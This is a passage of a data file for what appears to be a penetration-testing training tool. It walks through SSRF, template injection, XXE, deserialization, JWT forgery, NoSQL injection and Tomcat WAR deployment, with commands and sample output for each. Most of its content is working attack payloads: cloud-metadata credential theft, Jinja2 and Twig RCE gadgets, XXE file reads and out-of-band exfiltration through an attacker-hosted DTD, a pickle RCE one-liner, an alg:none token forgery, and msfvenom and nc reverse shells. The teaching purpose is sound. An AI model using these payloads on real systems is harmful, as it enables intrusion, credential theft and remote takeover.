      leadup: [{"key":"urlparam","label":"A URL input","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a URL field","tool":"curl","where":"local","cmd":"curl -s http://<target>/ | grep -iE 'name=\"url\"|fetch|preview'","out":"<input name=\"url\" placeholder=\"https://example.com/image.png\">","sig":"name=\"url\"","teach":"An input that takes a URL is the SSRF surface: the server will fetch whatever you point it at."}]},{"key":"webhook","label":"An import/webhook setting","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a server-side fetcher","tool":"curl","where":"local","cmd":"curl -s http://<target>/settings/integrations","out":"{\"webhook_url\":\"\",\"import_from_url\":\"\",\"avatar_by_url\":\"\"}","sig":"webhook_url","teach":"A webhook or \"import from URL\" feature makes the server issue requests for you, which is SSRF by design."}]}],
      why: "SSRF is the bug that converts \"outside the network\" into \"inside it\", which is why it earns a probe on any input that even smells like a URL, however dull the feature looks. Its payoff scales with the environment: a flat lab box gives you an internal-only admin panel, while a cloud target can hand over credentials from the metadata service and, with them, the account. Reach for it early, because what it opens up (internal services, hosts you could not otherwise touch) usually dwarfs whatever you were originally poking at.",
      cmd: "curl -s 'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'", tool: 'curl',
      output: [
        '{',
        '  "AccessKeyId": "AKIAEXAMPLE123",',
        '  "SecretAccessKey": "wJalrXUtnFEMI/EXAMPLEKEY",',
        '  "Token": "IQoJb3JpZ2luX2VjE..."',
        '}',
      ].join('\n'),
      signal: '  "AccessKeyId": "AKIAEXAMPLE123",',
      teach: 'Server-Side Request Forgery makes the server fetch a URL you choose. Pointed at the cloud metadata endpoint (169.254.169.254) it leaks IAM credentials; pointed inside, it reaches services the firewall hides. The server is your proxy into places you cannot reach.',
    },
    'ssti': {
      how: {"lead":"Template injection runs code inside the template engine. Confirm evaluation, identify the engine, then climb from reading data to full RCE with that engine's syntax:","items":[{"t":"Confirm evaluation","d":"Send a math expression in template syntax. If {{7*7}} comes back as 49, your input is evaluated as a template, not printed as text.","demo":[{"run":"curl -s 'http://<target>/greet?name={{7*7}}'","out":"<h1>Hello 49</h1>","sig":"Hello 49"}],"note":"49 means evaluation; a literal 7*7 means it is not SSTI."},{"t":"Identify the engine","d":"A polyglot narrows it down. {{7*'7'}} returns 7777777 in Jinja2 (string repetition) but 49 in Twig, which splits the two most common engines.","demo":[{"run":"curl -s 'http://<target>/greet?name={{7*%277%27}}'","out":"<h1>Hello 7777777</h1>","sig":"7777777"}],"note":"7777777 points at Jinja2; 49 would point at Twig. The engine decides your RCE gadget."},{"t":"Read config and secrets","d":"Before RCE, template objects often expose config. In Jinja2, {{config}} dumps Flask settings, frequently including SECRET_KEY and database URIs.","demo":[{"run":"curl -s 'http://<target>/greet?name={{config}}'","out":"<h1>Hello &lt;Config {'SECRET_KEY': 'dev-s3cr3t', 'SQLALCHEMY_DATABASE_URI': 'mysql://app:...'}&gt;</h1>","sig":"'SECRET_KEY': 'dev-s3cr3t'"}],"note":"The SECRET_KEY alone lets you forge session cookies before you even reach RCE."},{"t":"Escalate to RCE (Jinja2)","d":"Walk Python's object model from a string to os.popen. lipsum, cycler, and request are common shortcuts that reach the os module in modern Jinja2.","demo":[{"run":"curl -s 'http://<target>/greet?name={{lipsum.__globals__.os.popen(%22id%22).read()}}'","out":"<h1>Hello uid=33(www-data) gid=33(www-data)</h1>","sig":"uid=33(www-data)"}],"note":"lipsum.__globals__ reaches os; .popen('id').read() runs the command and returns its output."},{"t":"Use the right gadget per engine","d":"Twig uses _self and filter('system'); Freemarker has Execute; Velocity and ERB have their own one-liners. Identify the engine first, then paste its known RCE primitive.","demo":[{"run":"curl -s \"http://<target>/greet?name={{['id']|filter('system')}}\"","out":"<h1>Hello uid=33(www-data) gid=33(www-data)</h1>","sig":"uid=33(www-data)"}],"note":"This is Twig's gadget (filter('system')); Freemarker uses Execute, Velocity and ERB their own. Match the primitive to the engine step 2 named."}]},
      leadup: [{"key":"reflect","label":"A reflected input","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Test for evaluation","tool":"curl","where":"local","cmd":"curl -s 'http://<target>/greet?name={{7*7}}'","out":"<h1>Hello 49</h1>","sig":"Hello 49","teach":"The page rendered 7*7 as 49, so your input is evaluated as a template expression, not printed as text."}]},{"key":"feature","label":"A template feature","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a template editor","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"200      GET  /admin/email-templates\n200      GET  /preview","sig":"200      GET  /admin/email-templates","teach":"A template or email-preview editor renders user-controlled templates on the server, the richest SSTI surface there is."}]}],
      why: "Template injection is RCE hiding behind a friendly feature, a name field, a search box, an email template, that passes your input through a server-side template engine. The famous {{7*7}} test is just the detector: if 49 comes back, the server is executing template code, and template code reaches a shell. Try it wherever your input is reflected into a page. Which engine you hit (Jinja2, Twig, Freemarker) decides the exact payload, so fingerprint it before you escalate.",
      cmd: "curl -s 'http://10.10.10.10/hello?user={{7*7}}'", tool: 'curl',
      output: [
        '<h1>Hello 49</h1>',
      ].join('\n'),
      signal: '<h1>Hello 49</h1>',
      teach: 'You sent {{7*7}} and the page returned 49, the template engine evaluated your input instead of printing it. Server-Side Template Injection often escalates straight to remote code execution; identify the engine, then build the RCE payload.',
    },
    'xxe': {
      how: {"lead":"An XML parser that resolves external entities reads files and makes requests for you. Define an entity, pull it into the response, and escalate to SSRF or out-of-band when nothing reflects:","items":[{"t":"Read a file with an external entity","d":"Declare a DOCTYPE with an ENTITY pointing at file:///etc/passwd, then reference it where the response echoes a value back. The parser inlines the file.","demo":[{"run":"curl -s http://<target>/api -H \"Content-Type: application/xml\" --data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r><name>&x;</name></r>'","out":"{\"error\":\"Unknown user: root:x:0:0:root:/root:/bin/bash\"}","sig":"root:x:0:0"}],"note":"The file contents came back inside the reflected name field: file read confirmed."},{"t":"Pivot the parser into SSRF","d":"Swap file:// for http:// and the parser fetches a URL for you, reaching internal services or cloud metadata exactly like SSRF.","demo":[{"run":"curl -s http://<target>/api -H \"Content-Type: application/xml\" --data '<!DOCTYPE r [<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><r><name>&x;</name></r>'","out":"{\"error\":\"Unknown user: iam/ hostname/ instance-id/\"}","sig":"iam/"}],"note":"The metadata index came back, so the XML parser is now your SSRF primitive."},{"t":"Go out-of-band when nothing reflects","d":"Blind XXE? Host an external DTD on your box that reads a file and sends it back in a second request. Parameter entities smuggle the data into a URL you control.","demo":[{"run":"curl -s http://<target>/api -H \"Content-Type: application/xml\" --data '<!DOCTYPE r [<!ENTITY % d SYSTEM \"http://<lhost>/evil.dtd\"> %d;]><r/>'","out":"(on your box)  GET /leak?x=root:x:0:0:root HTTP/1.1","sig":"/leak?x=root"}],"note":"The target fetched your DTD and sent the file back in the URL: blind XXE exfiltration."},{"t":"Carry it in an Office doc or SVG","d":"A .docx or .xlsx is a ZIP of XML, so drop your DOCTYPE into word/document.xml and re-zip; an uploaded SVG is parsed as XML too. Both smuggle XXE through image and document upload features.","demo":[{"run":"curl -s -F \"avatar=@xxe.svg\" http://<target>/profile/upload","out":"{\"status\":\"ok\",\"alt_text\":\"web01.corp.local\"}","sig":"web01.corp.local"}],"note":"xxe.svg carries a DOCTYPE reading /etc/hostname; parsed as XML on upload it leaked the hostname. A .docx (word/document.xml) smuggles the same payload."}]},
      leadup: [{"key":"xmlapi","label":"An XML API","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Flip the Content-Type","tool":"curl","where":"local","cmd":"curl -s -X POST http://<target>/api/import -H 'Content-Type: application/xml' -d '<x/>'","out":"{\"error\":\"Invalid XML: root element <x> has no <data> child\"}","sig":"Invalid XML","teach":"A parser error after switching to application/xml proves the endpoint parses XML, which is the XXE surface."}]},{"key":"docupload","label":"An Office-doc upload","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a document upload","tool":"curl","where":"local","cmd":"curl -s http://<target>/upload | grep -i accept","out":"<input type=\"file\" name=\"doc\" accept=\".docx,.xlsx,.pptx,.svg\">","sig":"accept=\".docx,.xlsx,.pptx,.svg\"","teach":"Office documents and SVGs are XML inside; an upload that parses them server-side can resolve external entities."}]}],
      why: "XXE is easy to walk past because XML hides inside things that do not look like XML: a SAML login, a .docx upload, an API that quietly accepts application/xml. That invisibility is exactly why you test for it on purpose instead of hoping to stumble over it. Treat a dependable file read as the baseline win and pivoting the parser into SSRF as the upgrade; only chase RCE on the rare parser that permits it, since the file read alone is usually enough to find your next step.",
      cmd: 'curl -s -X POST http://10.10.10.10/api -H "Content-Type: application/xml" --data-binary @xxe.xml', tool: 'curl',
      output: [
        '<result>',
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        '</result>',
      ].join('\n'),
      signal: 'root:x:0:0:root:/root:/bin/bash',
      teach: 'XML External Entity injection abuses a parser that resolves external entities. Your payload declares one pointing at file:///etc/passwd and the response echoes the file back. Any endpoint that accepts XML is worth testing.',
    },
    'deserialization': {
      how: {"lead":"An app that deserializes attacker-controlled data can be driven to build objects and run code. Identify the format, then reach for the right gadget chain:","items":[{"t":"Identify the format","d":"The bytes give it away: O:4:\"User\" is serialized PHP; rO0AB (base64) or the AC ED magic is Java; gASV or a pickle opcode is Python; __VIEWSTATE is .NET.","demo":[{"run":"echo \"Tzo0OiJVc2VyIjoxOntzOjQ6InJvbGUiO3M6NDoidXNlciI7fQ==\" | base64 -d","out":"O:4:\"User\":1:{s:4:\"role\";s:4:\"user\";}","sig":"O:4:\"User\""}],"note":"O:4:\"User\" is a serialized PHP object; if the app unserializes the cookie, you control it."},{"t":"PHP object injection","d":"Change the object's properties, or swap in a class whose __wakeup or __destruct does something dangerous. The app triggers the magic method on unserialize.","demo":[{"run":"curl -s -b 'data=O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}' http://<target>/me","out":"{\"role\":\"admin\",\"note\":\"privileged\"}","sig":"\"role\":\"admin\""}],"note":"Editing one property escalated your role; a gadget chain in a vulnerable class turns this into RCE."},{"t":"Java gadget chain (ysoserial)","d":"Java deserialization RCE is a solved problem: ysoserial builds a payload for the libraries on the classpath. Base64 it into the vulnerable field.","demo":[{"run":"java -jar ysoserial.jar CommonsCollections5 \"id\" | base64 -w0","out":"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLwryw...","sig":"rO0ABX"}],"note":"That rO0 blob, dropped into the Java serialized field, runs id on the server when deserialized."},{"t":"Python pickle","d":"pickle.loads on untrusted data is RCE by design: __reduce__ returns a callable and its args, so a tiny pickle that calls os.system runs on load.","demo":[{"run":"python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(type(\"x\",(),{\"__reduce__\":lambda s:(os.system,(\"id\",))})())).decode())'","out":"gASV...<base64 pickle>...","sig":"gASV"}],"note":"Feed that base64 pickle to a vulnerable loader and os.system(\"id\") executes."},{"t":"Find the sink","d":"The bug is wherever untrusted bytes meet a deserializer: a cookie, a hidden field, __VIEWSTATE, a message queue, an API body. Decode anything that looks serialized and test whether you control it.","demo":[{"run":"curl -s -i http://<target>/account | grep -iE 'set-cookie|viewstate'","out":"Set-Cookie: profile=Tzo0OiJVc2VyIjoxOntzOjQ6InJvbGUiO3M6NDoidXNlciI7fQ%3D%3D; path=/","sig":"profile=Tzo0OiJVc2Vy"}],"note":"The profile cookie is a URL-encoded serialized PHP object: that is the sink. Decode it, edit a property, and confirm the app honours the change."}]},
      leadup: [{"key":"phpcookie","label":"A serialized PHP cookie","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Decode the cookie","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/ | grep -i set-cookie","out":"Set-Cookie: data=Tzo0OiJVc2VyIjoxOntzOjQ6InJvbGUiO3M6NDoidXNlciI7fQ%3D%3D","sig":"Tzo0OiJVc2Vy","teach":"That value base64-decodes to O:4:\"User\":1:{...}, a serialized PHP object; if the app unserializes it you control object injection."}]},{"key":"javablob","label":"A Java serialized blob","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Spot the magic bytes","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/api/state | grep -iE 'viewstate|rO0'","out":"session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...","sig":"rO0AB","teach":"rO0AB is base64 for the Java serialized-stream header (AC ED 00 05); a ysoserial gadget chain against this is remote code execution."}]}],
      why: "When an app rebuilds objects from data it trusts, serialized blobs in cookies, ViewState, or API bodies, a crafted blob can run code during that rebuild. Recognise the markers (Java rO0AB, .NET __VIEWSTATE, PHP O:4:), because the exploit is language-specific and gadget-chain heavy, so this is a \"know it when you see it\" move more than a blind probe. Reach for it when you spot a serialized blob under your control; it is high-impact but rarely the first thing to try.",
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
      teach: 'When an app deserialises attacker-controlled data, a crafted object (ysoserial builds them) runs code as it is rebuilt. Start a listener, then POST the gadget blob, the app runs it and dials back to you. Look for serialised data in cookies, parameters, and APIs.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'nc -lvnp 4444', output: 'listening on [any] 4444 ...' },
        { where: 'local', tool: 'curl', cmd: 'curl -s -X POST http://10.10.10.10/api --data-binary @cc5-payload.bin', output: [
          '↩ the app deserialised it and ran your gadget, caught on your listener:',
          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
          'uid=0(root) gid=0(root) groups=0(root)',
        ].join('\n') },
      ],
    },
    'jwt-attacks': {
      how: {"lead":"A JWT is only as strong as its signature. Decode it, then work the ladder from the free wins (none, a weak secret) up to key confusion and a leaked key:","items":[{"t":"Decode and read the claims","d":"A JWT is three base64url parts: header.payload.signature. Decode the first two to see the algorithm and the claims (user, role) you will want to forge.","demo":[{"run":"echo eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.x | cut -d. -f1-2 | tr . \"\\n\" | base64 -d","out":"{\"alg\":\"HS256\"}{\"role\":\"user\"}","sig":"\"role\":\"user\""}],"note":"alg is HS256 and role is user; change role to admin and all you need is a valid signature."},{"t":"Try alg:none","d":"If the server honours alg:none it accepts an unsigned token. Set the header algorithm to none, change the claims, and drop the signature entirely.","demo":[{"run":"curl -s -H \"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.\" http://<target>/api/me","out":"{\"role\":\"admin\",\"user\":\"admin\"}","sig":"\"role\":\"admin\""}],"note":"No signature needed: the server trusted alg:none and handed you an admin identity."},{"t":"Crack a weak HMAC secret","d":"HS256 signs with a shared secret. If it is weak, hashcat recovers it offline, after which you can sign any token you like.","demo":[{"run":"hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt","out":"eyJhbGci...:secret123\nStatus.........: Cracked","sig":":secret123"}],"note":"The secret is secret123; re-sign a token with role:admin and it verifies cleanly."},{"t":"Confuse RS256 with HS256","d":"If the server verifies RS256 with its public key but also accepts HS256, sign an HS256 token using that public key as the HMAC secret. The server verifies it with the same key.","demo":[{"run":"python3 jwt_tool.py TOKEN -X k -pk public.pem","out":"[+] Forged HS256 token signed with the RSA public key:\neyJhbGciOiJIUzI1NiJ9...","sig":"signed with the RSA public key"}],"note":"The public key is not secret, so if HS256 is allowed you forge valid tokens with it."},{"t":"Use a secret leaked in source","d":"With the app source (a git exposure or LFI), the signing secret is usually right there in config. Lift it and mint tokens directly.","demo":[{"run":"grep -riE \"jwt.?secret|signing.?key\" /www/app/config","out":"config/app.php:    $JWT_SECRET = \"Sup3rS3cr3tKey!\";","sig":"JWT_SECRET"}],"note":"A hardcoded JWT_SECRET turns token forgery into a one-liner."}]},
      leadup: [{"key":"cookie","label":"A JWT in the cookie","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Read the session cookie","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/login -d 'user=guest&pass=guest' | grep -i set-cookie","out":"Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.1n4...; HttpOnly","sig":"eyJhbGciOiJIUzI1NiJ9","teach":"The eyJ... prefix is a base64url JWT header, so authentication rides in a token you can decode and tamper with."}]},{"key":"api","label":"A Bearer token from an API","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Log in to the API","tool":"curl","where":"local","cmd":"curl -s http://<target>/api/login -H 'Content-Type: application/json' -d '{\"user\":\"guest\",\"pass\":\"guest\"}'","out":"{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.aZ...\"}","sig":"\"token\":\"eyJhbGci","teach":"An API that returns a JWT trusts that token on every later request; that trust in the signature is exactly what you attack."}]}],
      why: "Wherever authentication rides in a JWT, the two cheapest checks in web pentesting live here: an alg:none token and a guessable HMAC secret each take under a minute and either one mints any account you want. That asymmetry, seconds of effort against a full auth bypass, is why you run them on every token you meet before reaching for anything slower. The heavier wins, key confusion or a secret lifted from leaked source, are for later, once the free checks are spent.",
      cmd: "echo $TOKEN | cut -d. -f2 | base64 -d", tool: 'sh',
      output: [
        '{"user":"guest","role":"user","iat":1700000000}',
      ].join('\n'),
      signal: '{"user":"guest","role":"user","iat":1700000000}',
      teach: 'Decode the token first, the middle segment is the claims. If the server accepts alg:none, or the HMAC secret is weak enough to crack (hashcat -m 16500), you re-sign a token that says role:admin. The claims tell you exactly what to tamper with.',
    },
    'nosql-injection': {
      how: {"lead":"MongoDB queries are structures, not strings, so operator objects slip in where a password belongs. Bypass the login, then extract data a character at a time:","items":[{"t":"Bypass login with $ne","d":"Send operators instead of strings. user[$ne]=x and pass[$ne]=x mean 'not equal to x', always true, so the query matches the first user, usually admin.","demo":[{"run":"curl -s \"http://<target>/login\" --data \"user[$ne]=x&pass[$ne]=x\"","out":"{\"status\":\"ok\",\"user\":\"admin\",\"redirect\":\"/dashboard\"}","sig":"\"user\":\"admin\""}],"note":"No password at all: $ne made the condition always true and logged you in as admin."},{"t":"Bypass in JSON","d":"JSON APIs take the same operators as nested objects. Set the password to a {\"$ne\": null} object to match any stored value for a named user.","demo":[{"run":"curl -s \"http://<target>/api/login\" -H \"Content-Type: application/json\" --data '{\"user\":\"admin\",\"pass\":{\"$ne\":null}}'","out":"{\"token\":\"eyJ...\",\"role\":\"admin\"}","sig":"\"role\":\"admin\""}],"note":"The password object matches any value, so you log in as a chosen user without the password."},{"t":"Extract with $regex","d":"Know the username but need the password? $regex leaks it one character at a time: test ^a, ^b, ... and watch which returns a success.","demo":[{"run":"curl -s \"http://<target>/login\" --data \"user=admin&pass[$regex]=^s\"","out":"{\"status\":\"ok\",\"user\":\"admin\"}","sig":"\"status\":\"ok\""}],"note":"A success on ^s means the password starts with s; extend the pattern to recover the whole value."},{"t":"Inject JavaScript with $where","d":"Where the app uses $where or mapReduce you can inject server-side JavaScript: 1==1 is a universal match and sleep(5000) proves blind execution.","demo":[{"run":"curl -s -o /dev/null -w \"%{time_total}\\n\" \"http://<target>/search\" --data \"q[$where]=sleep(5000)\"","out":"5.01","sig":"5.01"}],"note":"A 5s delay means your JavaScript ran server-side, the richest NoSQLi primitive there is."},{"t":"Automate the extraction","d":"The character-at-a-time regex loop is tedious by hand, so NoSQLMap or a short script drives it once you have proven the vector manually.","demo":[{"run":"nosqlmap -u http://<target>/login --data \"user=admin&pass=x\" --attack regex","out":"[+] Field 'pass' extracted: S3cretP@ss","sig":"extracted: S3cretP@ss"}],"note":"Having proven $regex by hand, NoSQLMap drives the character-at-a-time loop and recovers the whole password for you."}]},
      leadup: [{"key":"stack","label":"A Mongo-backed stack","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Fingerprint the backend","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/ | grep -i x-powered-by","out":"X-Powered-By: Express","sig":"X-Powered-By: Express","teach":"Express very often fronts MongoDB, so a JSON login on this stack is a prime target for operator-object injection."}]},{"key":"error","label":"A telltale error","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Provoke a database error","tool":"curl","where":"local","cmd":"curl -s 'http://<target>/search?q[%24gt]='","out":"CastError: Cast to string failed for value \"{ '$gt': '' }\"\n    at model.Query.exec (/app/node_modules/mongoose/...)","sig":"mongoose","teach":"A Mongoose stack trace confirms a NoSQL backend and, crucially, that query operators like $gt reach the database."}]}],
      why: "This is one of the fastest auth bypasses there is, so it belongs at the very top of your list the moment a login talks to MongoDB or takes JSON where a string belongs. Test it before you even consider brute-forcing, because a single operator object can log you in as admin with nothing to guess. The habit worth building is spotting the backend quickly, since the whole attack only applies where the datastore is NoSQL.",
      cmd: "curl -s -i -X POST http://10.10.10.10/login -d 'user[$ne]=x&pass[$ne]=x'", tool: 'curl',
      output: [
        'HTTP/1.1 302 Found',
        'Location: /dashboard',
        'Set-Cookie: session=loggedin-as-admin; Path=/',
      ].join('\n'),
      signal: 'Set-Cookie: session=loggedin-as-admin; Path=/',
      teach: 'NoSQL backends like MongoDB take query operators as input. {"$ne":"x"} means "not equal to x" (always true), so the login matches the first user and you are in without a password. Test JSON and array parameters against NoSQL apps.',
    },
    'tomcat-deploy': {
      how: {"lead":"Tomcat's manager app deploys WAR files, which is code execution. Get into the manager, build a WAR shell, deploy it, and trigger it:","items":[{"t":"Try default and weak creds","d":"Tomcat ships example credentials admins forget: tomcat:tomcat, admin:admin, tomcat:s3cret. Try them against /manager/html before brute-forcing.","demo":[{"run":"curl -s -u tomcat:s3cret http://<target>:8080/manager/html | grep -i \"Application Manager\"","out":"<h1>Tomcat Web Application Manager</h1>","sig":"Tomcat Web Application Manager"}],"note":"The manager page means those creds work and you can deploy."},{"t":"Build a WAR shell","d":"msfvenom packages a JSP reverse shell into a deployable WAR. The file name becomes the URL path once deployed.","demo":[{"run":"msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=4444 -f war -o app.war","out":"Payload size: 1098 bytes\nSaved as: app.war","sig":"Saved as: app.war"}],"note":"app.war is a JSP shell; deploying it registers an /app/ context that runs on request."},{"t":"Deploy through the manager","d":"Upload the WAR via the manager's text deploy API with your credentials. Tomcat unpacks and registers it immediately.","demo":[{"run":"curl -s -u tomcat:s3cret -T app.war \"http://<target>:8080/manager/text/deploy?path=/app\"","out":"OK - Deployed application at context path [/app]","sig":"OK - Deployed application"}],"note":"The app is live at /app/; start your listener before you trigger it."},{"t":"Trigger the shell","d":"Request the deployed context to fire the payload, with your nc listener ready to catch the connection.","demo":[{"run":"curl -s http://<target>:8080/app/","out":"(on your listener)  connect to [<lhost>] from <target>\nuid=1001(tomcat) gid=1001(tomcat)","sig":"uid=1001(tomcat)"}],"note":"You land as the tomcat user; local privesc from here is the next lane."}]},
      leadup: [{"key":"manager","label":"An exposed manager","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 9.0.30)","sig":"8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 9.0.30)","teach":"The interesting service is not the plain web server but what is listening alongside it."},{"title":"Check for the manager app","tool":"curl","where":"local","cmd":"curl -s -o /dev/null -w '%{http_code}\\n' http://<target>:8080/manager/html","out":"401","sig":"401","teach":"A 401 on /manager/html means the manager is present and only a password stands between you and deploying a WAR shell."}]},{"key":"errorpage","label":"A version-leaking 404","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1","sig":"8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1","teach":"The interesting service is not the plain web server but what is listening alongside it."},{"title":"Read a 404 page","tool":"curl","where":"local","cmd":"curl -s http://<target>:8080/nope","out":"<h3>Apache Tomcat/9.0.30</h3>","sig":"Apache Tomcat/9.0.30","teach":"Tomcat's default 404 prints its exact version, which tells you the manager path and any version-specific default credentials worth trying."}]}],
      why: "A reachable Tomcat Manager plus any valid credential is code execution: you deploy a WAR webshell and it runs as the Tomcat service account. The credentials come from defaults (tomcat:tomcat, admin:admin) or from a tomcat-users.xml you read through LFI. Reach for it whenever you see Tomcat and have, or can guess, manager creds. Build the WAR on your own box first; \"OK - Deployed\" means your shell is live and waiting.",
      signal: 'OK - Deployed application at context path [/shell]',
      teach: 'Tomcat Manager with valid creds lets you deploy a WAR (your own app) which runs as the Tomcat service account. First build the WAR on your box, then upload it; "OK - Deployed" means your JSP shell is live at /shell. Request it to get code execution.',
      steps: [
